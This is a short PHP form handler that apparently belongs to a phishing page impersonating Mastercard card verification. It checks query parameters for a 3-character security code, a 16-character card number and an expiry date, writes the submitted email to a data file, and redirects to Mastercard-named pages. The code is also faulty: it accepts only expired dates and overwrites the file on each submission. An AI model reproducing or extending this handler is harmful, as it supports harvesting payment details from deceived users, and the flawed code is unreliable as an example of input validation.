<?php
    if(isset($_GET['verify'])) {
        $verification = $_GET['verify'];
        $length = strlen($verification);
        $account = $_GET['account'];
        $accountlength = strlen($account);
        $expire = $_GET['expire'];
        $expiry = strtotime($expire);

        if($length == 3 && $accountlength == 16 && time() > $expiry) {
            $email = $_GET['email'];

            $emailfile = fopen('../data/emails.txt', 'w');
            fwrite($emailfile, $email);
            fclose($emailfile);
            header('Location: thankyou.php');
        } else {
            if($length != 3) {
                header("Location: mastercardverf.php");
            } else if($accountlength != 16) {
                header("Location: mastercardacc.php");
            } else if(time() < $expiry) {
                header("Location: mastercardexp.php");
            }
        }
    }
?>